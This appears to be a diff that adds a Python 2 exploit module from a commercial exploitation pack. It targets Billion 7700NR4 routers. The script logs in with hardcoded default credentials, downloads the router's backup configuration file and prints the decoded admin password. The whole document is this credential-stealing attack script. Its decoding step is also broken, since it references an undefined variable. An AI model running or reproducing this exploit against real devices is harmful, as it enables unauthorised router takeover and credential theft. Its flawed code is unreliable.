@@ -1,0 +1,41 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2016
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+import base64
+
+_name_   = 'd2sec_billion_1'
+_vendor_ = 'billion'
+_model_  = ['7700NR4']
+_vuln_   = 'Hardcoded credentials vulnerability '
+_cve_    = ''
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+    def_user = def_pass = "user"
+    try:
+      r = requests.get("http://" + host + "/backupsettings.conf" , auth=(def_user,def_pass))
+      if(r.status_code == 200):
+        print "[+] %s vulnerable" % host
+        temp = r.text
+        print "[+] Admin password: " + str(base64.b64decode(admin_pass))
+      else:
+        print "[+] %s not vulnerable" % host
+    except Exception, e:
+      print '[-] error : %s' % e
+      return
+
+    
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
